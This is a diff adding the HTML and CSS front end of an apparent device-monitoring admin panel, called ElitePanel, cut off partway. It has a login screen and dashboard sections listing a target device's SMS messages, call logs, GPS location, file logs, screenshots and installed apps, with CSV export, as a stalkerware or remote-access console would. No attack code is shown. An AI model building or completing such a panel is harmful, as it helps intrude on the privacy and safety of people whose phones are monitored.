@@ -1,0 +1,2442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel Elite - Device Monitoring</title>
+    
+    <!-- Google Fonts: Inter (Modern, Clean UI Font) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <!-- Bootstrap 5 CSS (Base for layout) -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    
+    <!-- Font Awesome CSS (Using v6 for more icon options) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <!-- Leaflet CSS (for GPS Map) -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
+    <style>
+        :root {
+            --primary-color: #4F46E5; /* Indigo-600 from Tailwind as a modern primary */
+            --primary-color-rgb: 79, 70, 229;
+            --primary-hover-color: #4338CA; /* Indigo-700 */
+            --primary-light-bg: rgba(79, 70, 229, 0.08); /* Lighter bg for hover/ subtle elements */
+            
+            --secondary-color: #10B981; /* Emerald-500 for success/online status */
+
+            --light-bg: #F8FAFC; /* Slate-50 */
+            --sidebar-bg: #FFFFFF;
+            --content-bg: #FFFFFF;
+            
+            --text-color-dark: #1E293B;  /* Slate-800 */
+            --text-color-medium: #475569; /* Slate-600 */
+            --text-color-light: #94A3B8;  /* Slate-400 */
+            
+            --border-color-soft: #E2E8F0; /* Slate-200 */
+            --border-color-medium: #CBD5E1; /* Slate-300 */
+
+            --card-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.07), 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --card-shadow-hover: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            
+            --font-family-sans-serif: 'Inter', sans-serif;
+            --border-radius-sm: 0.375rem; /* 6px */
+            --border-radius-md: 0.5rem;   /* 8px */
+            --border-radius-lg: 0.75rem;  /* 12px */
+
+            --toast-bg-success: #D1FAE5;
+            --toast-text-success: #065F46;
+            --toast-border-success: #6EE7B7;
+            --toast-bg-error: #FEE2E2;
+            --toast-text-error: #991B1B;
+            --toast-border-error: #FCA5A5;
+            --toast-bg-info: #DBEAFE;
+            --toast-text-info: #1E40AF;
+            --toast-border-info: #93C5FD;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: var(--font-family-sans-serif);
+            background-color: var(--light-bg);
+            color: var(--text-color-medium);
+            line-height: 1.65;
+            font-size: 15px; /* Slightly smaller base for more content fit */
+        }
+
+        /* --- Login Screen --- */
+        .login-container {
+            max-width: 400px;
+            margin: 5rem auto;
+            padding: 2.5rem; /* Increased padding */
+            background-color: var(--content-bg);
+            border-radius: var(--border-radius-lg);
+            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
+        }
+        .login-container h2 {
+            font-weight: 700;
+            color: var(--text-color-dark);
+            font-size: 1.75rem;
+        }
+        .login-container .form-control {
+            border-radius: var(--border-radius-md);
+            padding: 0.85rem 1.1rem;
+            border: 1px solid var(--border-color-medium);
+            background-color: var(--light-bg); /* Subtle background for inputs */
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .login-container .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(var(--primary-color-rgb), 0.2);
+            background-color: var(--content-bg);
+        }
+        .login-container .btn-primary {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            border-radius: var(--border-radius-md);
+            padding: 0.85rem;
+            font-weight: 600;
+            font-size: 1rem;
+            transition: background-color 0.2s ease, transform 0.1s ease;
+        }
+        .login-container .btn-primary:hover {
+            background-color: var(--primary-hover-color);
+            border-color: var(--primary-hover-color);
+            transform: translateY(-1px);
+        }
+        .login-container .btn-primary:active {
+            transform: translateY(0px);
+        }
+
+        /* --- Dashboard --- */
+        #dashboard-screen {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        /* --- Sidebar --- */
+        #sidebar {
+            width: 270px; /* Slightly wider */
+            background-color: var(--sidebar-bg);
+            border-right: 1px solid var(--border-color-soft);
+            padding: 1.25rem 0;
+            transition: margin-left 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            flex-direction: column;
+        }
+        #sidebar .sidebar-header {
+            padding: 0 1.25rem 1.25rem 1.25rem;
+            margin-bottom: 0.75rem;
+        }
+        #sidebar .sidebar-header h4 {
+            font-weight: 700;
+            color: var(--primary-color);
+            font-size: 1.5rem; /* Larger brand */
+            display: flex;
+            align-items: center;
+        }
+        #sidebar .sidebar-header h4 i {
+            margin-right: 0.65rem;
+            font-size: 1.3em;
+        }
+        #sidebar .nav-link {
+            color: var(--text-color-medium);
+            padding: 0.8rem 1.5rem; /* Adjusted padding */
+            margin: 0.15rem 1rem; /* Reduced vertical margin, increased horizontal */
+            border-radius: var(--border-radius-md);
+            display: flex;
+            align-items: center;
+            font-weight: 500; /* Medium weight for nav links */
+            transition: background-color 0.2s ease, color 0.2s ease, transform 0.15s ease;
+            font-size: 0.95rem;
+        }
+        #sidebar .nav-link .fa-fw { /* Use fa-fw for fixed width icons */
+            margin-right: 1rem; /* Increased margin */
+            font-size: 1.05em; /* Slightly larger icons */
+            width: 22px; /* Ensure fixed width */
+        }
+        #sidebar .nav-link:hover {
+            background-color: var(--primary-light-bg);
+            color: var(--primary-color);
+            transform: translateX(3px);
+        }
+        #sidebar .nav-link.active {
+            background-color: var(--primary-color);
+            color: #fff;
+            font-weight: 600; /* Bolder active link */
+            box-shadow: 0 4px 10px -2px rgba(var(--primary-color-rgb), 0.3);
+        }
+        #sidebar .nav-link.active i {
+            color: #fff;
+        }
+        #sidebar .nav-link.active:hover {
+             transform: translateX(0); /* No transform on active hover */
+        }
+
+
+        /* --- Main Content Wrapper --- */
+        #main-content-wrapper {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden; 
+        }
+
+        /* --- Topbar --- */
+        #topbar {
+            background-color: var(--content-bg);
+            border-bottom: 1px solid var(--border-color-soft);
+            padding: 0.85rem 1.75rem; /* Increased padding */
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            min-height: 70px; /* Increased height */
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.03);
+        }
+        #topbar #menu-toggle {
+            display: none;
+            background: transparent;
+            border: none;
+            font-size: 1.35rem;
+            color: var(--text-color-medium);
+            padding: 0.5rem;
+            border-radius: var(--border-radius-sm);
+        }
+        #topbar #menu-toggle:hover {
+            color: var(--primary-color);
+            background-color: var(--primary-light-bg);
+        }
+        #topbar #uid-selector {
+            border-radius: var(--border-radius-md);
+            font-size: 0.9rem;
+            padding: 0.45rem 0.85rem;
+            border-color: var(--border-color-medium);
+            min-width: 180px; /* Give it some base width */
+        }
+         #topbar #uid-selector:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(var(--primary-color-rgb), 0.2);
+        }
+        #topbar #admin-email {
+            font-size: 0.9rem;
+            color: var(--text-color-medium);
+            font-weight: 500;
+        }
+        #topbar #logout-button {
+            border-radius: var(--border-radius-md);
+            font-weight: 500;
+            padding: 0.45rem 0.9rem;
+        }
+        #topbar #logout-button i {
+            margin-right: 0.4rem;
+        }
+
+        /* --- Content Area --- */
+        main#main-content-area { /* ID for specificity */
+            padding: 1.75rem; 
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+        .content-section {
+            background-color: var(--content-bg);
+            border-radius: var(--border-radius-lg);
+            box-shadow: var(--card-shadow);
+            margin-bottom: 1.75rem;
+            padding: 1.75rem; 
+            opacity: 0;
+            transform: translateY(15px);
+            transition: opacity 0.45s cubic-bezier(0.4, 0, 0.2, 1), transform 0.45s cubic-bezier(0.4, 0, 0.2, 1);
+            display: none; /* Initially hidden, JS will manage */
+        }
+        .content-section.active-section {
+            display: block; /* Managed by JS for animation */
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .content-section h2 {
+            font-size: 1.6rem; /* Slightly larger titles */
+            font-weight: 700; /* Bolder titles */
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid var(--border-color-soft);
+            color: var(--text-color-dark);
+            display: flex;
+            align-items: center;
+        }
+        .content-section h2 i {
+            margin-right: 0.85rem;
+            color: var(--primary-color);
+            font-size: 0.9em; /* Relative to h2 size */
+        }
+        
+        /* --- Enhanced Table Styling --- */
+        .table {
+            border-collapse: separate;
+            border-spacing: 0;
+            width: 100%;
+        }
+        .table thead th {
+            background-color: #F9FAFB; /* Slate-50, very light */
+            color: var(--text-color-medium);
+            font-weight: 600; /* Bolder headers */
+            text-transform: uppercase;
+            font-size: 0.7rem; /* Smaller, more discreet header text */
+            letter-spacing: 0.075em;
+            padding: 0.85rem 1.1rem; /* More padding */
+            border-bottom: 2px solid var(--border-color-soft);
+            text-align: left;
+        }
+        .table tbody tr {
+            transition: background-color 0.15s ease;
+        }
+        .table tbody tr:hover {
+            background-color: var(--primary-light-bg); 
+        }
+        .table tbody td {
+            padding: 0.95rem 1.1rem; /* More padding for cells */
+            vertical-align: middle;
+            border-bottom: 1px solid var(--border-color-soft);
+            font-size: 0.9rem;
+            color: var(--text-color-dark); /* Darker text for table data */
+        }
+         .table tbody td .text-muted { color: var(--text-color-light) !important; }
+        .table tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        /* Search Input */
+        .search-input {
+            max-width: 400px; /* Or adjust as needed */
+            margin-bottom: 1rem; /* Add some space below it */
+        }
+
+
+        /* --- Loading, No Data & Error States --- */
+        .loading-spinner-container, .no-data-message-container, .error-message-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 3.5rem 1rem;
+            color: var(--text-color-medium);
+            min-height: 250px;
+            border: 2px dashed var(--border-color-soft);
+            border-radius: var(--border-radius-md);
+            background-color: #FCFDFD; /* Very light, almost white */
+        }
+        .loading-spinner-container .spinner-border {
+            width: 3.5rem;
+            height: 3.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1.25rem;
+        }
+        .loading-spinner-container p, .no-data-message-container p, .error-message-container p {
+            font-size: 1.05rem;
+            font-weight: 500;
+        }
+        .no-data-message-container i.fa-xl, .error-message-container i.fa-xl { 
+            font-size: 3.5rem; /* Larger icon */
+            margin-bottom: 1.25rem;
+            color: var(--text-color-light); 
+        }
+        .error-message-container i.fa-xl {
+            color: #EF4444; /* Red-500 for error icon */
+        }
+         .error-message-container p {
+            color: var(--text-color-dark); /* Darker text for error messages */
+        }
+
+
+        /* --- Specific Elements Styling --- */
+        .screenshot-item {
+            position: relative;
+            overflow: hidden;
+            border-radius: var(--border-radius-md);
+            box-shadow: var(--card-shadow);
+        }
+        .screenshot-item img {
+            display: block;
+            width: 160px; /* Slightly larger */
+            height: 160px;
+            object-fit: cover; /* Ensures image covers the area, might crop */
+            margin: 0; 
+            border: none; 
+            border-radius: 0;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        .screenshot-item:hover img {
+            transform: scale(1.1);
+        }
+         .screenshot-item::after { /* Overlay for timestamp */
+            content: attr(data-timestamp);
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
+            color: white;
+            padding: 0.75rem 0.5rem 0.35rem 0.5rem;
+            font-size: 0.7rem;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+        }
+        .screenshot-item:hover::after {
+            opacity: 1;
+        }
+
+        #gps-map {
+            height: 480px; /* Increased height */
+            width: 100%;
+            border-radius: var(--border-radius-md);
+            border: 1px solid var(--border-color-medium);
+        }
+        .list-group-item {
+            border-color: var(--border-color-soft);
+            padding: 0.9rem 1.35rem;
+            background-color: transparent; /* For use within cards */
+            color: var(--text-color-dark);
+        }
+        .list-group-item strong { font-weight: 600; }
+        .list-group-item .badge { font-size: 0.85em; padding: .4em .7em }
+
+        .btn-info {
+            background-color: #06B6D4; /* Cyan-500 */
+            border-color: #06B6D4;
+            color: white;
+        }
+        .btn-info:hover {
+            background-color: #0891B2; /* Cyan-600 */
+            border-color: #0891B2;
+        }
+
+        /* Export Button Styling */
+        .btn-sm.export-csv-btn {
+            padding: 0.5rem 1rem;
+            font-size: 0.875rem;
+            font-weight: 500;
+            border-radius: var(--border-radius-md);
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+            color: white;                        
+            transition: background-color 0.2s ease, border-color 0.2s ease;
+        }
+        .btn-sm.export-csv-btn:hover {
+            background-color: var(--primary-hover-color); 
+            border-color: var(--primary-hover-color);
+        }
+        .btn-sm.export-csv-btn i { margin-right: 0.4rem; }        
+
+        /* Editable Alias */
+        #device-alias-display { font-weight: 600; color: var(--text-color-dark); }
+        #edit-alias-btn { 
+            margin-left: 0.6rem; 
+            color: var(--text-color-light);
+            border: 1px solid transparent; /* for alignment */
+        }
+        #edit-alias-btn:hover { color: var(--primary-color); background-color: var(--primary-light-bg); }
+        #edit-alias-form { max-width: 320px; }
+        #edit-alias-form .form-control-sm { border-radius: var(--border-radius-sm); }
+        #edit-alias-form .btn-sm { border-radius: var(--border-radius-sm); }
+
+
+        /* Responsive Sidebar */
+        @media (max-width: 992px) { 
+            #sidebar {
+                margin-left: -270px;
+                position: fixed;
+                top: 0;
+                bottom: 0;
+                z-index: 1040; 
+                height: 100%;
+                overflow-y: auto;
+                box-shadow: 4px 0 15px rgba(0,0,0,0.1); /* Shadow for mobile sidebar */
+            }
+            #sidebar.active {
+                margin-left: 0;
+            }
+            #main-content-wrapper {
+                width: 100%;
+            }
+            #topbar #menu-toggle {
+                display: block;
+            }
+        }
+        @media (max-width: 576px) {
+            main#main-content-area { padding: 1rem; }
+            .content-section { padding: 1rem; }
+            .content-section h2 { font-size: 1.3rem; margin-bottom: 1rem; padding-bottom: 0.75rem; }
+            .content-section h2 i { margin-right: 0.6rem; }
+            .table thead th, .table tbody td { padding: 0.7rem 0.8rem; font-size: 0.85rem;}
+            #topbar { padding: 0.6rem 1rem; min-height: 60px; }
+            #topbar .ms-2.d-none.d-sm-inline, #topbar #admin-email { 
+                display: none !important;
+            }
+            #topbar #uid-selector { max-width: 140px; font-size: 0.8rem; }
+            .search-input { max-width: 100%; }
+        }
+
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--light-bg);
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--border-color-medium);
+            border-radius: 10px;
+            border: 2px solid var(--light-bg); /* Creates padding around thumb */
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-color-light);
+        }
+
+        /* Toast Styling */
+        .toast-container {
+            z-index: 1090; /* Higher than most elements */
+        }
+        .toast {
+            font-size: 0.9rem;
+            border-radius: var(--border-radius-md);
+            box-shadow: var(--card-shadow-hover);
+        }
+        .toast-header {
+            font-weight: 600;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+        .toast.bg-success-custom {
+            background-color: var(--toast-bg-success) !important;
+            color: var(--toast-text-success) !important;
+            border: 1px solid var(--toast-border-success);
+        }
+        .toast.bg-success-custom .toast-header {
+            background-color: rgba(255,255,255,0.2);
+            color: var(--toast-text-success);
+            border-bottom: 1px solid var(--toast-border-success);
+        }
+         .toast.bg-success-custom .btn-close {
+            filter: invert(40%) sepia(50%) saturate(500%) hue-rotate(100deg);
+        }
+
+        .toast.bg-danger-custom {
+            background-color: var(--toast-bg-error) !important;
+            color: var(--toast-text-error) !important;
+            border: 1px solid var(--toast-border-error);
+        }
+        .toast.bg-danger-custom .toast-header {
+             background-color: rgba(255,255,255,0.2);
+            color: var(--toast-text-error);
+            border-bottom: 1px solid var(--toast-border-error);
+        }
+        .toast.bg-danger-custom .btn-close {
+             filter: invert(20%) sepia(80%) saturate(800%) hue-rotate(330deg);
+        }
+        .toast.bg-info-custom {
+            background-color: var(--toast-bg-info) !important;
+            color: var(--toast-text-info) !important;
+            border: 1px solid var(--toast-border-info);
+        }
+        .toast.bg-info-custom .toast-header {
+             background-color: rgba(255,255,255,0.2);
+            color: var(--toast-text-info);
+            border-bottom: 1px solid var(--toast-border-info);
+        }
+         .toast.bg-info-custom .btn-close {
+            filter: invert(30%) sepia(80%) saturate(600%) hue-rotate(180deg);
+        }
+        
+        .pagination-controls {
+            user-select: none;
+        }
+        .pagination-controls .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Toast Container -->
+    <div class="toast-container position-fixed top-0 end-0 p-3">
+        <!-- Toasts will be appended here by JavaScript -->
+    </div>
+
+    <!-- Login Screen -->
+    <div id="login-screen">
+        <div class="container login-container">
+            <div class="text-center mb-5">
+                 <i class="fas fa-fingerprint fa-3x mb-3" style="color: var(--primary-color);"></i>
+                 <h2>Elite Panel Access</h2>
+                 <p class="text-muted mt-2">Securely access your device monitoring dashboard.</p>
+            </div>
+            <form id="login-form">
+                <div class="mb-3">
+                    <label for="email" class="form-label fw-medium">Email Address</label>
+                    <input type="email" class="form-control" id="email" required placeholder="you@example.com">
+                </div>
+                <div class="mb-4"> <!-- Increased margin bottom -->
+                    <label for="password" class="form-label fw-medium">Password</label>
+                    <input type="password" class="form-control" id="password" required placeholder="••••••••">
+                </div>
+                <button type="submit" class="btn btn-primary w-100 mt-2">
+                    <i class="fas fa-sign-in-alt me-2"></i>Log In
+                </button>
+                <div id="login-error" class="text-danger small mt-3 text-center"></div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Dashboard Screen -->
+    <div id="dashboard-screen" style="display: none;">
+        <!-- Sidebar -->
+        <nav id="sidebar">
+            <div class="sidebar-header">
+                <h4><i class="fas fa-shield-halved"></i> ElitePanel</h4>
+            </div>
+            <ul class="nav flex-column flex-grow-1">
+                <li class="nav-item">
+                    <a class="nav-link active" href="#" data-section="device-overview"><i class="fas fa-tachometer-alt fa-fw"></i> Overview</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="messages"><i class="fas fa-comments fa-fw"></i> Messages</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="call-logs"><i class="fas fa-phone-alt fa-fw"></i> Call Logs</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="installed-apps"><i class="fas fa-cubes fa-fw"></i> Installed Apps</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="battery-info"><i class="fas fa-battery-three-quarters fa-fw"></i> Battery</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="gps-location"><i class="fas fa-map-location-dot fa-fw"></i> GPS Location</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="file-logs"><i class="fas fa-folder-open fa-fw"></i> File Logs</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="screenshots"><i class="fas fa-camera-retro fa-fw"></i> Screenshots</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="notifications"><i class="fas fa-bell fa-fw"></i> Notifications</a> <!-- Corrected Icon -->
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="#" data-section="device-info"><i class="fas fa-server fa-fw"></i> Device Info</a>
+                </li>
+            </ul>
+             <div class="p-3 mt-auto text-center border-top border-top-1" style="font-size:0.8rem; color: var(--text-color-light);">
+                <i class="far fa-copyright"></i> ElitePanel v2.1 <!-- Version Updated -->
+            </div>
+        </nav>
+
+        <!-- Main Content Wrapper -->
+        <div id="main-content-wrapper">
+            <!-- Topbar -->
+            <nav id="topbar">
+                <div class="d-flex align-items-center">
+                    <button class="btn btn-light me-3" id="menu-toggle" aria-label="Toggle Menu"><i class="fas fa-bars"></i></button>
+                    <span class="ms-1 d-none d-sm-inline fw-medium" style="color: var(--text-color-dark);">Device:</span>
+                    <select id="uid-selector" class="form-select form-select-sm d-inline-block w-auto ms-2"></select>
+                </div>
+                <div class="d-flex align-items-center">
+                    <span id="admin-email" class="me-3">user@example.com</span>
+                    <button id="logout-button" class="btn btn-outline-danger btn-sm">
+                        <i class="fas fa-sign-out-alt"></i> Logout
+                    </button>
+                </div>
+            </nav>
+
+            <!-- Content Area -->
+            <main id="main-content-area">
+                <!-- Device Overview -->
+                <div id="device-overview-content" class="content-section">
+                    <h2><i class="fas fa-tachometer-alt"></i> Device Overview</h2>
+                    <div id="device-overview-data">
+                        <div class="row gy-3"> <!-- gy-3 for vertical gutter -->
+                            <div class="col-lg-7 col-md-12">
+                                <strong class="text-muted">Device Alias:</strong> 
+                                <span id="device-alias-display" class="fs-5 me-2">N/A</span>
+                                <button id="edit-alias-btn" class="btn btn-sm btn-light py-0 px-1 border-0" title="Edit Alias" aria-label="Edit Alias"><i class="fas fa-pencil-alt"></i></button>
+                                <div id="edit-alias-form" style="display:none;" class="mt-1 input-group input-group-sm">
+                                    <input type="text" id="device-alias-input" class="form-control form-control-sm">
+                                    <button id="save-alias-btn" class="btn btn-sm btn-primary">Save</button>
+                                    <button id="cancel-alias-btn" class="btn btn-sm btn-secondary">Cancel</button>
+                                </div>
+                            </div>
+                            <div class="col-lg-2 col-md-6"><strong class="text-muted">Status:</strong> <span id="device-status">N/A</span></div>
+                            <div class="col-lg-3 col-md-6"><strong class="text-muted">Last Seen:</strong> <span id="device-last-seen">N/A</span></div>
+                        </div>
+                    </div>
+                    <div class="loading-spinner-container" style="display:none;"><div class="spinner-border"></div><p>Loading Overview...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-binoculars fa-xl"></i><p>No overview data available for the selected device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load overview data.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="device-overview"><i class="fas fa-file-csv"></i> Export Overview</button>
+                </div>
+
+                <!-- Messages -->
+                <div id="messages-content" class="content-section">
+                    <h2><i class="fas fa-comments"></i> Messages</h2>
+                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in From/To or Message Body..." data-sectionkey="messages">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead><tr><th>Date</th><th>From/To</th><th>Message Body</th><th>Type</th></tr></thead>
+                            <tbody id="messages-table-body"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination-controls mt-3 text-center" style="display: none;">
+                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="messages">Previous</button>
+                        <span class="page-info mx-2">Page 1</span>
+                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="messages">Next</button>
+                    </div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Messages...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-comment-dots fa-xl"></i><p>No messages found for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load messages.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="sms"><i class="fas fa-file-csv"></i> Export Messages</button>
+                </div>
+
+                <!-- Call Logs -->
+                <div id="call-logs-content" class="content-section">
+                    <h2><i class="fas fa-phone-alt"></i> Call Logs</h2>
+                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in Number..." data-sectionkey="call-logs">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead><tr><th>Date</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead>
+                            <tbody id="call-logs-table-body"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination-controls mt-3 text-center" style="display: none;">
+                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="call-logs">Previous</button>
+                        <span class="page-info mx-2">Page 1</span>
+                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="call-logs">Next</button>
+                    </div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Call Logs...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-phone-slash fa-xl"></i><p>No call logs recorded for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load call logs.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="calls"><i class="fas fa-file-csv"></i> Export Call Logs</button>
+                </div>
+
+                <!-- Installed Apps -->
+                <div id="installed-apps-content" class="content-section">
+                    <h2><i class="fas fa-cubes"></i> Installed Apps</h2>
+                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in App Name or Package Name..." data-sectionkey="installed-apps">
+                    <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead><tr><th>App Name</th><th>Package Name</th><th>Version</th></tr></thead>
+                            <tbody id="installed-apps-table-body"></tbody>
+                        </table>
+                    </div>
+                     <div class="pagination-controls mt-3 text-center" style="display: none;">
+                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="installed-apps">Previous</button>
+                        <span class="page-info mx-2">Page 1</span>
+                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="installed-apps">Next</button>
+                    </div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading App List...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-box-open fa-xl"></i><p>No installed applications found for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load app list.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="apps"><i class="fas fa-file-csv"></i> Export App List</button>
+                </div>
+
+                <!-- Battery Info -->
+                <div id="battery-info-content" class="content-section">
+                    <h2><i class="fas fa-battery-three-quarters"></i> Battery Status</h2>
+                    <div id="battery-info-data" class="list-group list-group-flush"></div> <!-- list-group-flush for cards -->
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Fetching Battery Info...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-battery-empty fa-xl"></i><p>Battery information unavailable for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load battery information.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="battery"><i class="fas fa-file-csv"></i> Export Battery Info</button>
+                </div>
+
+                <!-- GPS Location -->
+                <div id="gps-location-content" class="content-section">
+                    <h2><i class="fas fa-map-location-dot"></i> GPS Location</h2>
+                    <div id="gps-map" class="mb-3"></div>
+                    <div id="gps-info-data" class="list-group list-group-flush"></div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Acquiring GPS Data...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-compass-slash fa-xl"></i><p>No GPS data found or reported for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load GPS data.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="gps"><i class="fas fa-file-csv"></i> Export GPS Data</button>
+                </div>
+
+                <!-- File Logs -->
+                <div id="file-logs-content" class="content-section">
+                    <h2><i class="fas fa-folder-open"></i> File Logs</h2>
+                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in Path..." data-sectionkey="file-logs">
+                     <div class="table-responsive">
+                        <table class="table table-hover">
+                            <thead><tr><th>Path</th><th>Size</th><th>Last Modified</th></tr></thead>
+                            <tbody id="file-logs-table-body"></tbody>
+                        </table>
+                    </div>
+                    <div class="pagination-controls mt-3 text-center" style="display: none;">
+                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="file-logs">Previous</button>
+                        <span class="page-info mx-2">Page 1</span>
+                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="file-logs">Next</button>
+                    </div>
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading File Logs...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="far fa-file-excel fa-xl"></i><p>No file activity logged for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load file logs.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="files"><i class="fas fa-file-csv"></i> Export File Logs</button>
+                </div>
+
+                <!-- Screenshots -->
+                <div id="screenshots-content" class="content-section">
+                    <h2><i class="fas fa-camera-retro"></i> Screenshots Gallery</h2>
+                    <div id="screenshots-gallery" class="d-flex flex-wrap gap-3 justify-content-center"></div> <!-- gap-3 for spacing -->
+                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Screenshots...</p></div>
+                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-image-slash fa-xl"></i><p>No screenshots available for this device.</p></div>
+                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load screenshots.</p></div>
+                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="screenshots"><i class="fas fa-file-csv"></i> Export Screenshot URLs</button>
+                </div>
+
+                <!-- Notifications -->
+                <div id="notifications-content" class="content-section">
